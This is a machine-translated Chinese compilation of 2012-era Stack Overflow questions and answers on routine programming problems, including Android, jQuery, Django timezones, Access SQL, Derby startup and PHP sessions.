
* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-28T19:37:29.690

是的，你在正确的轨道上。您需要将您的根元素更改`MainPage.xaml`为您的自定义基类：

```
<test:HistoryRemoverPage x:Class="Test.MainPage"                   
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:phone="clr-namespace:Microsoft.Phone.Controls;assembly=Microsoft.Phone"
    <!-- ... ---> 
    xmlns:test="clr-namespace:Test">

         <!--LayoutRoot is the root grid where all page content is placed-->
         <Grid x:Name="LayoutRoot" Background="Transparent">
              <!-- ... --->
         </Gird>    

</test:HistoryRemoverPage> 
```

请注意，您需要添加您的基类命名空间 ( `xmlns:test`) 以便在 XAML 中指定您的基类。

# android - Android中的LTE值RSRP、RSRQ

> ID：14074656
> 
> 赞同：1
> 
> 时间：2012-12-28T19:27:40.027
> 
> 标签：android, lte

反正有没有得到LTE值RSRP，RSRQ？？？我认为我们可以通过使用 CellSignalStrengthLte 获得价值。但是这个类是在 API 级别 17 中添加的。所以我们不能将它安装到真实设备上。

有没有办法通过 ICS 设备获得价值？

和

```
Creator<CellSignalStrengthLte> lte_signal = new Creator<CellSignalStrengthLte>() {

    CellSignalStrengthLte lte_signal;

    @Override
    public CellSignalStrengthLte[] newArray(int size) {
        // TODO Auto-generated method stub
        lte_rsrq = lte_signal.getDbm();
        textOut.append(String.format("RSRP(LTE):%s", lte_rsrq));
        return null;
    }

    @Override
    public CellSignalStrengthLte createFromParcel(Parcel source) {
        // TODO Auto-generated method stub
        return null;
    }
}; 
```

这是获得 LTE 价值的正确结构吗？

请告诉我....！！！谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-03-04T05:00:12.803

您可以参考 Android 文档了解 cellSignalStrengthGsm

```
 CellInfoGsm cellinfogsm = (CellInfoGsm)telephonyManager.getAllCellInfo().get(0);
                CellSignalStrengthGsm cellSignalStrengthGsm = cellinfogsm.getCellSignalStrength();
                cellSignalStrengthGsm.getDbm(); 
```

# android - 创建适配器时出错

> ID：14074665
> 
> 赞同：0
> 
> 时间：2012-12-28T19:28:34.207
> 
> 标签：android, actionbarsherlock, android-arrayadapter

当我想在 ListView 中设置包含字符串和位图的“PaysItem”列表时。我正在使用 a`SherlockListFragment`并且该行出现错误： `ArrayAdapter<PaysItem> adapter = new ArrayAdapter<PaysItem>(getActivity().getBaseContext(), R.layout.pays_item,list);`

pays_item.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
  xmlns:android="http://schemas.android.com/apk/res/android"
  android:layout_width="fill_parent"
  android:layout_height="wrap_content">
  <ImageView
   android:id="@+id/image"
android:layout_width="50dip"
android:layout_height="50dip" android:scaleType="centerCrop"/>
 <TextView xmlns:android="http://schemas.android.com/apk/res/android"
 android:id="@+id/text_pays"
 android:textColor="#FFFFFF"
 android:background="#000000"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:padding="10dp"
    android:textSize="14sp" >
</TextView>
</LinearLayout> 
```

错误是：

```
You must supply a resource ID for a TextView 
```

错误很明显，我必须提供一个 TextView ID，但如何解决呢？

谢谢你的帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:32:43.257

**错误 ：**

> 您必须为 TextView 提供资源 ID

意味着您需要将 TextView id 传递给`ArrayAdapter`. 将其传递为：

```
ArrayAdapter<PaysItem> adapter = new ArrayAdapter<PaysItem>
        (getActivity().getBaseContext(), R.layout.pays_item,R.id.text_pays,list); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T19:39:02.453

您需要实现自己的适配器，否则您将看不到任何图片。请看这里： [如何使用 ArrayAdapter<myClass>](https://stackoverflow.com/questions/2265661/how-to-use-arrayadaptermyclass)

# java - NFC 权限错误

> ID：14074671
> 
> 赞同：1
> 
> 时间：2012-12-28T19:29:14.933
> 
> 标签：java, android, eclipse, permissions, nfc

我正在开发一个使用 NFC 的应用程序，但我不断收到此错误，

```
`12-28 14:19:41.962: E/AndroidRuntime(27523): java.lang.RuntimeException: 无法恢复活动 {com.example.clinkguitest/com.example.clinkguitest.MainActivity}: java.lang.SecurityException: NFC需要权限：用户 10168 和当前进程都没有 android.permission.NFC。`

```

我`android:permission="android.permission.NFC"`在我的清单中有什么是错的？谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T20:39:22.900

在我的清单权限中，如下所示：

```
 <uses-permission android:name="android.permission.NFC" /> 
```

也许这就是问题所在？

# html - 有没有办法让我知道哪些文件受到使用 Sublime Text 2 的 CSS 规则的影响？

> ID：14074674
> 
> 赞同：1
> 
> 时间：2012-12-28T19:29:24.270
> 
> 标签：html, css, sublimetext2

如上所述，我希望能够找到项目中受 css 规则影响的所有文件。例如，我输入“#header .container li”，我得到了应用该规则的所有文件。

为了更清楚，假设我有一个包含这些 html 文件的项目：

```
File 1:
---------------------
<html>
 <div id="header">
    <div class="container">
      <ul>
         <li>Something</li>
         <li>Something</li>
       </ul>
    </div>
  </div> 
</html>
---------------------

File 2:
---------------------
<html>
 <div id="header2">
    <div class="container">
      <ul>
         <li>Something</li>
         <li>Something</li>
       </ul>
    </div>
  </div> 
</html>
---------------------

File 3:
---------------------
<html>
 <div id="header">
    <div class="container">
      <ul>
         <li class="nomatter">Something</li>
         <li>Something</li>
       </ul>
    </div>
  </div> 
</html>
--------------------- 
```

如果我输入“#header .container li”（CSS 规则），我希望得到文件 1 和文件 3，因为它们受到我输入的 css 规则的影响。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-29T09:19:09.657

使用插件/包[元素查找器](https://github.com/keeganstreet/sublime-elfinder)（需要 nodejs）。

抄自其作者[的介绍帖](http://keegan.st/2012/09/01/introducing-element-finder-for-sublime-text-2/)：

> Element Finder 是一个供 Web 开发人员查找哪些 HTML 文件包含与特定 CSS 选择器匹配的元素的工具。你可能是一个项目的新手，回到一个你有一段时间没有工作过的项目，或者 CSS 选择器不清楚，你不确定它会影响哪些页面。只需将 CSS 选择器复制到元素查找器中，您将很快看到项目中与该选择器匹配的所有 HTML 元素。例如，如果您搜索 `div.main`，它将显示所有具有类名的 DIV 元素 `main`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-10-24T04:24:31.650

对于不支持 Element Finder 插件的编辑器用户，您可以使用与[*element-finder* npm 模块](https://github.com/keeganstreet/element-finder)（由同一作者）的命令行界面相同的核心功能。

```
npm install -g element-finder

elfinder -s ".layout-fluid #sidebar" -i ".tmp, dist" -x "html, php" 
```

*   -s 是 CSS 选择器
*   -i 被忽略的文件夹
*   -x 是要搜索的文件扩展名

# c# - windows mobile 6.1 干净启动后自动启动应用程序

> ID：14074676
> 
> 赞同：1
> 
> 时间：2012-12-28T19:29:43.300
> 
> 标签：c#, windows-mobile, boot

我有一个 c# 应用程序，我在 Windows Mobile 6.1 设备上的 cleanboot 期间安装。它安装正确，但是，我需要让它在干净启动后自动启动。

我总是必须在干净启动后对手持设备进行热启动才能启动。

我怎样才能避免这种情况？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-29T08:53:04.990

我假设，您正在使用 CAB 文件在 cleanboot 期间安装您的 C# 应用程序。

在使用 DLL 的 Install_Exit 函数调用安装 cab 文件后，您可以在 cab 中使用 setup.dll 来启动您的应用程序（setupdll 示例，例如：http: [//www.codeproject.com/Articles/7724/Creating- Pocket-PC-Application-Setup-Packages-Usin](http://www.codeproject.com/Articles/7724/Creating-Pocket-PC-Application-Setup-Packages-Usin)）。但是 MS 声明您不能依赖 cab 安装本身的调用文件。

另一种方法是在您的 C# 应用程序安装后安装第二个 cab，并且只调用您的应用程序，即使使用设置 dll。

另请参阅[http://msdn.microsoft.com/en-us/library/bb158796.aspx](http://msdn.microsoft.com/en-us/library/bb158796.aspx)，了解如何将多个 cab 打包到一个安装中。

cleanboot 安装程序和 AutoStart 的问题是，操作系统已经运行了 \Windows\StartUp 并且在安装 cab 时还运行了其他自动启动。因此，您通常需要重新启动，然后使用 StartUp（或 HKLM\Init）执行您的应用程序。

您还可以使用脚本引擎来安装 cab，然后启动已安装的应用程序。例如使用 MortScript，它支持在 SD Card\2577 或类似目录（卷名\2577）中用作“AutoStart.exe”。该脚本可以调用 wceload.exe 来安装您的应用程序，然后启动已安装应用程序的可执行文件。就像使用批处理一样。

由于这是一个 Intermec 安装，您可以使用 \Flash File Store\UserAutoInstall_sstransferagent.xml 来自动安装和启动应用程序。

例如：您的 cab 位于 \Flash File Store\MyInstall\MyCab.cab 并将 MyApp.exe 安装到 \Program Files\MyApp：

```
<?xml version="1.0"?>
<Devices>
    <Device Type="" Family="" Model="" Boot="">
        <Files SrcDir="\Flash File Store\UserAutoInstall">
            <File SrcName="" 
               DestName="wceload.exe" 
               DestDir="\Windows" 
               Run="true" 
               CmdLine='"\Flash File Store\MyInstall\MyCab.cab" /silent /verifyconfig /nodelete' 
            />
        <File SrcName="" 
               DestName="MyApp.exe" 
               DestDir="\Program Files\MyApp\MyApp.exe" 
               Run="NoWait" 
               CmdLine='' 
            />
        </Files>
   </Device>
</Devices> 
```

问候

# xml - 使用 Spring MVC 在不解析休息服务的情况下转发 xml

> ID：14074689
> 
> 赞同：0
> 
> 时间：2012-12-28T19:30:43.740
> 
> 标签：xml, rest, spring-mvc

我正在尝试添加一个中间层 rest 服务，它实际上通过调用另一个 restservice 来获取一个 xml。我想发送与我的中间层服务的输出相同的 xml。我不想解析xml，有什么办法吗？我正在使用Spring3 MVC开发这个中间层休息服务。实际上我想转发xml而不解析。任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T17:50:47.970

您可以将您从其他 REST 服务获得的 InputStream 连接到您的 OutputStream：

```
@RequestMapping(value = "/forward/")
public void foo(HttpServletResponse response)  {
  InputStream in = //... get inputstream from your other REST service
  IOUtils.copy(in, response.getOutputStream());
} 
```

# python - 带有UTC偏移量的django DateTimeField？

> ID：14074696
> 
> 赞同：20
> 
> 时间：2012-12-28T19:31:22.257
> 
> 标签：python, django, django-timezone

我有一个带有 DateTimeField 的模型：

```
deadline = models.DateTimeField(verbose_name="Valid unitl", null=True, blank=True) 
```

应允许用户在字段中输入日期、时间和时区信息。这是我想要的格式：

```
2012-12-31 23:30 +0430 
```

我希望在存储到数据库之前将时间转换为 UTC。所以我尝试为此使用模型表单，但`Enter a valid date/time.`如果我输入上面的值，它会在该 DateTimeField 上引发验证错误。

这是在 settings.py 中：

```
DATE_INPUT_FORMATS = ('%Y-%m-%d %H:%M %Z', ) 
```

我错过了什么？

**编辑：**

根据 Видул Петров 的建议，尝试使用表单字段：

```
deadline2 = forms.DateTimeField(input_formats=['%Y-%m-%d %H:%M %Z',], 
```

得到同样的效果：`Enter a valid date/time.`

**编辑 2**

看来 datetime 无法处理“%z”参数。这会引发 ValueError：

```
datetime.datetime.strptime(value, format) 
```

所以我在控制台中测试了它：

```
>>> import datetime
>>> datetime.datetime.strptime('2012-12-30 19:00 +0100', "%Y-%m-%d %H:%M %z")
Traceback (most recent call last):
File "<console>", line 1, in <module>
File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/_strptime.py", line 317, in _strptime
(bad_directive, format))
ValueError: 'z' is a bad directive in format '%Y-%m-%d %H:%M %z' 
```

还尝试了pytz：

```
>>> import pytz
>>> pytz.datetime.datetime.strptime('2012-12-30 19:00 +0100', "%Y-%m-%d %H:%M %z")
Traceback (most recent call last):
File "<console>", line 1, in <module>
File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/_strptime.py", line 317, in _strptime
(bad_directive, format))
ValueError: 'z' is a bad directive in format '%Y-%m-%d %H:%M %z' 
```

我真的觉得这应该工作。我是否错过了其他说明的文档的某些部分？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-02-05T18:57:11.027

当您在设置`USE_TZ = True`中进行设置时，Django 以 UTC 格式将日期和时间信息存储在数据库中，否则它将存储**原始**日期时间（没有时区的日期时间）。

在大多数情况下，使用 Django 的时区支持非常方便，因为输入和输出日期时间将由 Django 自动转换。

但是，如果您确实需要用户输入时区，则需要设置`USE_TZ = False`然后使用 DateTimeField，它是天真的日期时间以及 CharField，将时区信息存储在您的 models.py 中。

参考：[https ://docs.djangoproject.com/en/2.1/topics/i18n/timezones/](https://docs.djangoproject.com/en/2.1/topics/i18n/timezones/)

# .net - 不要将用户信息集成到您的域模型中？

> ID：14074697
> 
> 赞同：0
> 
> 时间：2012-12-28T19:31:24.397
> 
> 标签：.net, asp.net-mvc

我已经阅读了一些关于 .NET 4.5 中新的简单会员提供程序的文章但我真的不明白为什么我应该将用户信息存储在不同的地方而不是域中？

任何人都可以解释我的优点和缺点是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T20:34:57.493

我写[了一篇关于相关问题的文章](http://blogs.teamb.com/craigstuntz/2010/03/05/38558/)。简而言之，这样做会使您的身份验证与您的域模型紧密耦合，这可能是错误的。您应该将可能属于您的域模型中的特定于域的用户数据的关注点与不属于您的域模型中的身份验证分开。

# javascript - 我试图在这段代码中找到错误

> ID：14074700
> 
> 赞同：-1
> 
> 时间：2012-12-28T19:31:31.773
> 
> 标签：javascript, drop-down-menu, menu

HTML是：

```
<ul id="menu-tester" class="paper-box">
<li id="menu-item-308" class="menu-item menu-item-type-post_type menu-item-object-page              menu-item-308">Close Board Fencing</li>
<ul class="sub-menu">
<li id="menu-item-313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-313">Close Board Fencing Panels</li>
</ul>
</ul> 
```

​</p>

CSS是：

```
ul ul { display: none; }​ 
```

javascipt 是：

```
$("ul.menu").find('> li').hover(
function() {
    $(this).find('> ul').slideDown();
},
function() {
    $(this).find('> ul').hide();
}
);

$("ul.sub-menu").find('> li').on('click', function() {
    $(this).find('> ul').slideDown();
},
function() {
    $(this).find('> ul').hide();
}
);​ 
```

我似乎无法让它工作，另请参阅下面的 jsfiddle 链接。

[http://jsfiddle.net/PaxTg/770/](http://jsfiddle.net/PaxTg/770/)

提前谢谢了

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:35:05.197

您的意思是使用 jQuery v1.4.2 吗？on 方法当时可能不可用。尝试 .bind() 代替，或者在你的小提琴中更新到更新版本的 jQ。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:37:21.353

我看到的第一个问题是没有`ul`类`menu`。

这意味着`$("ul.menu")`永远不会开火。

我还有其他一些建议给你，但首先我需要你回答上面的评论..

# javascript - JQuery UI 的自动完成框的任何轻量级版本？

> ID：14074703
> 
> 赞同：0
> 
> 时间：2012-12-28T19:31:59.933
> 
> 标签：javascript, jquery, jquery-ui, autocomplete

我需要一个页面的自动完成选择框，比如[JQuery 的自动完成框](http://jqueryui.com/autocomplete/)。

但是，仅为该功能添加 JQuery 和 JQuery UI 似乎有些矫枉过正。有没有更轻的替代品？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:38:46.457

此代码项目示例从纯 javascript 构建一个自动完成，不依赖于 jQuery。 [代码项目](http://www.codeproject.com/Articles/485062/AJAX-AutoComplete-control-with-JavaScript-and-PHP)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T14:51:46.883

签出 DevBridge Ajax 自动完成：[https ://github.com/devbridge/jQuery-Autocomplete](https://github.com/devbridge/jQuery-Autocomplete)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-06-06T13:57:06.290

我们最近从 django-autocomplete-light 中提取了 JS，提供了您可能喜欢[的 jquery-autocomplete-light 。](https://github.com/yourlabs/jquery-autocomplete-light)

# api - Youtube API 如何获取视频信息

> ID：14074707
> 
> 赞同：3
> 
> 时间：2012-12-28T19:32:19.183
> 
> 标签：api, video, youtube

当您右键单击视频并说“显示视频信息”时，会有一个弹出窗口实时显示 fps、丢帧等，并带有时间戳。

我试图查看 API 文档，但找不到如何检索这些数据。

我想将此实时视频信息数据存储在一个文件中，并根据时间进行后期分析以了解视频流质量。

提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2017-06-04T06:13:13.350

您将不得不使用新的 v3 API。您可以在此处注册 YouTube 密钥：[https ://console.developers.google.com/apis/api/youtube.googleapis.com](https://console.developers.google.com/apis/api/youtube.googleapis.com)

文档：[https ://developers.google.com/youtube/v3/docs/videos/list](https://developers.google.com/youtube/v3/docs/videos/list)

要获取实际的视频信息，您可以使用以下 URL：

```
https://www.googleapis.com/youtube/v3/videos?id={VIDEO_ID}&part=snippet%2CcontentDetails%2Cstatistics &key={YOUR_API_KEY} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-04-10T20:02:13.037

# 请注意，此答案不再有效。请参阅下面[的 Dex 回答](https://stackoverflow.com/a/44351277/453435)。

应用程序可以看到的有关视频的所有数据都使用以下 URL 以 XML（或 JSON，如果您愿意）进行解析：

> **XML：** [http ://gdata.youtube.com/feeds/api/videos/###########?v=2](http://gdata.youtube.com/feeds/api/videos/###########?v=2)
> 
> **JSON：** [http ://gdata.youtube.com/feeds/api/videos/###########?v=2&alt=json-in-script](http://gdata.youtube.com/feeds/api/videos/###########?v=2&alt=json-in-script)

只需将########## 替换`?v=`为您的视频编号即可。例如：[http ://gdata.youtube.com/feeds/api/videos/rznYifPHxDg?v=2](http://gdata.youtube.com/feeds/api/videos/rznYifPHxDg?v=2)

# java - 使用 java 启动 derby db 服务器和客户端

> ID：14074709
> 
> 赞同：0
> 
> 时间：2012-12-28T19:32:36.893
> 
> 标签：java, connection, derby

我已经使用**Java Swing**制作了一个 Java 应用程序。它使用**derby db**作为数据库和 host= **localhost**。我可以 在 Windows 中使用命令提示符**启动数据库并将其连接到我的应用程序。但是要部署我的应用程序，希望通过我的 java 程序中的几行帮助****自动**发生这种情况。我尝试在 .bat 文件中执行命令，但使用它命令提示符的黑色窗口始终保持打开状态，这是我不想要的。所以我尝试这样做：-

```
Process pserver=Runtime.getRuntime().exec("cmd /c set DERBY_HOME=E:\\db-derby-10.9.1.0-bin");

ProcessBuilder pb = new ProcessBuilder("C:\\Program Files\\Java\\jdk1.6.0_33\\bin\\java", "-jar",  "E:\\db-derby-10.9.1.0-bin\\lib\\derbyrun.jar server start");
pserver= pb.start();

pserver=Runtime.getRuntime().exec("cmd /c set DERBY_INSTALL=E:\\db-derby-10.9.1.0-bin");  

pserver=Runtime.getRuntime().exec("cmd /c start set CLASSPATH=%DERBY_INSTALL%\\lib\\derbyclient.jar;%DERBY_INSTALL%\\lib\\derbytools.jar;. "); 
```

我还尝试使用 API [http://db.apache.org/derby/docs/10.0/manuals/admin/hubprnt14.html](http://db.apache.org/derby/docs/10.0/manuals/admin/hubprnt14.html) -NetworkServerControl。我无法理解要导入的包以及要包含的所有库。

有人请帮助我通过 API 或使用 Process 和 RunTime 类或其他更好的方法将我的 java 应用程序与 derby 数据库连接起来。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-29T05:44:01.040

也许您不需要将 Derby 作为网络服务器运行。为什么不直接在嵌入式模式下使用 Derby？有关更多信息，请参阅文档的这一部分：http: [//db.apache.org/derby/docs/10.9/getstart/cgsquck70629.html](http://db.apache.org/derby/docs/10.9/getstart/cgsquck70629.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T21:05:00.103

我发现了问题所在。我试图使用 netbeans (JavaDB) 的用户界面启动数据库服务器，该界面仅适用于 netbeans IDE，并且不会像其他组件那样自动将任何代码放入程序中。因此，要在外部环境中启动和停止数据库服务器，我必须明确键入[http://db.apache.org/derby/docs/10.8/adminguide/tadminconfig814963.html](http://db.apache.org/derby/docs/10.8/adminguide/tadminconfig814963.html)中给出的代码。

# mediaelement.js - MediaElements.js 中基于时间的事件

> ID：14074710
> 
> 赞同：2
> 
> 时间：2012-12-28T19:32:40.620
> 
> 标签：mediaelement.js

当玩家到达时间线上的某个点时，我试图触发回调。

我最初的想法是，使用 player.currentTime 调用来创建一个停止点数组。这会产生如下内容：

`[1.8429549932479858, 2.831857919692993, 3.981297016143799]`

接下来，使用`timeupdate`事件侦听器，我尝试将 currentTime 与我的数组进行比较以找到匹配的值。我使用 Math.round 添​​加了一些模糊匹配，但无法获得任何一致的结果。我看到的最大问题是该`timeupdate`方法仅每 250 毫秒触发一次。对于我的应用程序，分辨率不够。

我的问题是，有没有更直接的方法可以做到这一点？

非常感谢您的帮助！

# jquery - 全选/不选 切换具有名称[]（数组）命名约定的复选框

> ID：14074716
> 
> 赞同：0
> 
> 时间：2012-12-28T19:33:22.787
> 
> 标签：jquery, arrays, forms, post, checkbox

我有一个表单，其中包含多组复选框，这些复选框最初加载所有复选框。提交表单时，数组会根据“选中”的复选框在 $_POST 中构建。整个表单是通过 PHP 基于数据库数据动态构建的。

我希望实现的目标：我需要一个按钮或“可点击的东西”来切换所有复选框，在组内全部“未选中”，然后当再次单击该按钮时，它会再次切换所有“已选中”。或者这可以通过两个按钮来实现。（以更清洁/更容易为准）

示例：（这里只是两个简单的复选框数组组）（每个都需要独立于另一个进行切换）（我手动包装了下面的代码以将其全部显示在下面的框中）（这个示例只是表示PHP 代码构建）（示例中显示了两个按钮，但最好使用一个“全部切换”按钮）

```
<form action="" method="post" enctype="multipart/form-data" name="filters">

Select: <input name="select_all_regions" onclick="toggle_all_regions()" 
          type="button" value="all" /> 
/ <input name="select_no_regions" onclick="toggle_no_regions()" 
          type="button" value="none" />
<input name="regions[]" type="checkbox" value="7" checked />East Coast
<input name="regions[]" type="checkbox" value="14" checked />West Coast
<input name="regions[]" type="checkbox" value="15" checked />Gulf Coast

Select: <input name="select_all_places" onclick="toggle_all_places()" 
          type="button" value="all" /> 
/ <input name="select_no_places" onclick="toggle_no_places()" 
          type="button" value="none" />
<input name="places[]" type="checkbox" value="25" checked />Dock
<input name="places[]" type="checkbox" value="29" checked />Ramp
<input name="places[]" type="checkbox" value="34" checked />Natural

<input class="filter-button" id="filter-submit-button" name="go" 
          type="submit" value="Go!" />

</form> 
```

我已经尝试过：Javascript 和 jQuery，但“[]”似乎把它们都扔了。我确信有一个简单的解决方案，但到目前为止我一直无法找到它。

谢谢参观！！！

* * *

更新（到目前为止）：

我似乎做错了什么（它不起作用），这很明显吗？

到目前为止我尝试过的代码：

```
 <SCRIPT LANGUAGE="JavaScript"> 
    <!-- Begin 
    var $regions = $('input[name="regions[]"]');
    $('[name="select_all_regions"]').click(function(){
    $regions.prop('checked', !regions.first().is(':checked'));
    });
    // End --> 
    </script>

Select: <input name="select_all_regions" type="button" value="toggle all regions" /><br />

<input class="category-item-checkbox" name="regions[]" type="checkbox" value="7" checked /><span class="category-item-title">Uptown</span>
<input class="category-item-checkbox" name="regions[]" type="checkbox" value="14" checked /><span class="category-item-title">Warehouse District</span>
<input class="category-item-checkbox" name="regions[]" type="checkbox" value="15" checked /><span class="category-item-title">French Quarter</span> 
```

* * *

已解决：（由仓库）见下文。

我确信其他解决方案也可能有效，但此时我无法让它们发挥作用。

谢谢大家看这个！！！StackOverflow 社区摇滚！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:38:59.613

尝试以下操作：

```
var $places = $('input[name="places[]"]');
$('[name="select_all_places"]').click(function(){
  $places.prop('checked', !places.first().is(':checked'));
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T19:44:03.707

使用没有事件的确切 HTML `onclick`，您可以使用：

```
$('form[name="filters"]').click(function (e) {
    var match = e.target.name.match(/select_(all|no)_(.*)/);
    if (match) {
        $('input[name="' + match[2] + '[]"]').attr('checked', 'all' === match[1] && 'checked');
    }
}); 
```

[**演示**](http://jsfiddle.net/GHSrR/2/)

或更简单地说：

```
var $regions = $('input[name="regions[]"]'),
    $places = $('input[name="places[]"]');

$('input[name="select_all_regions"]').click(function() {
    $regions.attr('checked', 'checked');
});

$('input[name="select_no_regions"]').click(function() {
    $regions.attr('checked', false);
});

$('input[name="select_all_places"]').click(function() {
    $places.attr('checked', 'checked');
});

$('input[name="select_no_places"]').click(function() {
    $places.attr('checked', false);
}); 
```

​<strong> [DEMO](http://jsfiddle.net/GHSrR/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T19:47:32.313

您可以删除内联 onclick 功能，并为所有按钮设置一次单击事件

```
$('form[name=filters] input[type=button]').click(function() {
    var name = $(this).attr('name').split('_')[2];  // takes regions/places out of name 
    $('input[name="'+ name +'[]"]').prop('checked',$(this).val() == 'all');
});​ 
```

[http://jsfiddle.net/wirey00/KJUFU/](http://jsfiddle.net/wirey00/KJUFU/)

# sql - 使用案例 SQL 和 VBA 更新函数

> ID：14074717
> 
> 赞同：0
> 
> 时间：2012-12-28T19:33:29.937
> 
> 标签：sql, vba

我想尝试有一个 SQL 函数来更新我的表并在列中放置一个日期，我正在使用带有案例的更新函数，但我得到一个操作符丢失的错误。

但是我找不到错误，有人知道它在哪里吗？

```
Public Function Add_date( _
                        ByVal startDate As String, _
                        ByVal strTableName As String, _
                        ByVal strFieldName As String, _
                        ByVal strNummeringField As String) _
                        As Boolean

Dim strSql As String
    strSql = "ALTER TABLE " & strTableName & " ADD " & strFieldName & " date"
    DoCmd.RunSQL strSql
    strSql = "UPDATE " & strTableName & " SET " & strFieldName & " = CASE WHEN " & strNummeringField & " < 25 THEN '23-07-1991' ELSE '01-01-01' END"
    MsgBox strSql
    DoCmd.RunSQL strSql

End Function 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T20:52:40.603

Jet/ACE（MS Access 数据库引擎）不支持 CASE...WHEN。三元运算的等价物是 IIF（立即 if）。此外，日期分隔符是`#`，不是`'`。试试这个：

```
strSql = " UPDATE " & strTableName & _
         " SET " & strFieldName & " = " & _
         "     IIf(" & strNummeringField & " < 25, #23-07-1991#, #01-01-01#)" 
```

此外，无论您的区域设置如何，您都可能会在将日期格式化为 DD-MM-YYYY 时遇到问题。有关详细信息，请参阅[Access 中的国际日期。](http://allenbrowne.com/ser-36.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:39:36.147

一种可能性是表示表和列名的字符串包含无效字符。尝试将它们括在方括号中：

```
strSql = "ALTER TABLE [" & strTableName & "] ADD [" & strFieldName & "] date"
DoCmd.RunSQL strSql
strSql = "UPDATE [" & strTableName & "] SET [" & strFieldName & "] = CASE WHEN [" & strNummeringField & "] < 25 THEN '23-07-1991' ELSE '01-01-01' END" 
```

# php - 更改页面时重置 SESSION 变量

> ID：14074722
> 
> 赞同：1
> 
> 时间：2012-12-28T19:34:06.727
> 
> 标签：php, session, reset

> **可能重复：**
> [为什么在使用会话时需要 session_start？](https://stackoverflow.com/questions/2460979/why-session-start-is-needed-when-using-session)

我正在做我的第一个登录安全站点，我想在会话超全局中存储一个简单的布尔值。我知道我设置正确，因为我可以在同一个脚本中转储它，但是当我更改页面时，$_SESSION 数组被清空。

我正在运行 Nginx / Debian / php5 设置。

我已经看到，在使用特定主机时，会话变量可能需要存储在服务器端的文件或目录，但由于我在 vps 上，这不应该是我的情况。

它是这样的：

```
<?php
   session_start();
   $_SESSION['nom'] = 'Eric';
   var_dump($_SESSION); //wich outputs correctly 
?>
[the login form] 
```

然后我提交我的表单，我在目标页面的第一行 var_dump $_SESSION 但它是空的，所以它甚至没有设置。会话似乎完全关闭，只是我的 $_COOKIE['PHPSESSID'] 显示了正确的 ID。

我不知道如何更清楚或添加什么细节......如果需要，请询问！

# android - 通过应用内计费从付费变为免费

> ID：14074724
> 
> 赞同：6
> 
> 时间：2012-12-28T19:34:14.690
> 
> 标签：android, in-app-purchase

我在市场上有一款售价 0.99 美元的应用程序。我想实施应用内计费，以便我可以免费提供它，并可以选择以一定价格解锁某些功能。我已经修改了代码以允许这样做。问题是......我如何将已经购买该应用程序的 1000 多人标记为已购买并解锁所有功能？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T22:26:11.150

如果您使用某种持久性存储，您可能能够解决这个问题。

对于 SharedPreferences，在第一次运行时，使用`SharedPreferences.contains()`. 如果它包含它，则该应用程序必须已经安装。如果没有，请设置另一个将用户标记为新（免费）的首选项，然后再设置一个，这样它就不会每次都进行检查。

这可能仅在首选项没有“默认”值时才有效，我不完全确定在 xml 中设置默认值是否会将其标记为包含。

如果您有任何要转移到 SD 的资产或任何类似的一次性设置，您可以做类似的事情。在第一次做之前检查它是否已经完成。

如果您使用的是 SQLite 数据库，则可以增加数据库版本，`onUpgrade()`如果来自当前版本（或更早版本），则将其标记为“付费”。

就像我说的，这是一个 hack，但我不知道有任何“官方”方式来检查应用程序安装是升级还是初始安装。不过，这里有一些陷阱。例如，如果以前的付费客户在安装新版本之前完全卸载，或者如果它在新设备上......

# mysql - 将多个sql查询组合在一起

> ID：14074725
> 
> 赞同：0
> 
> 时间：2012-12-28T19:34:24.113
> 
> 标签：mysql

我有一个项目的多个表（会话、费用和付款）

为了获得会议，我正在做以下事情：

```
SELECT
sess.file_id,  SUM(sess.rate * sess.length) AS total
FROM
sess
WHERE sess.sessionDone = 1 
GROUP BY sess.file_id 
```

这将返回特定学生应支付的金额

我还有另一张桌子“收费”

```
SELECT
file_charges.file_id,  SUM(file_charges.price) AS total_charges
FROM
file_charges
GROUP BY file_charges.file_id 
```

最后是付款查询：

```
SELECT
file_payments.file_id,  SUM(file_payments.paymentAmount) AS total_payment
FROM
file_payments
GROUP BY file_payments.file_id 
```

我可以将这 3 个结合起来吗：

```
 Total = Payments - (Session + Charges) 
```

请注意，它可能是负数，因此我可以拥有 session 中存在的 file_id，费用但不在付款中，并且我可以在没有会话或费用的情况下进行付款...

编辑： [http ://sqlfiddle.com/#!2/a90d9](http://sqlfiddle.com/#!2/a90d9)

* * *

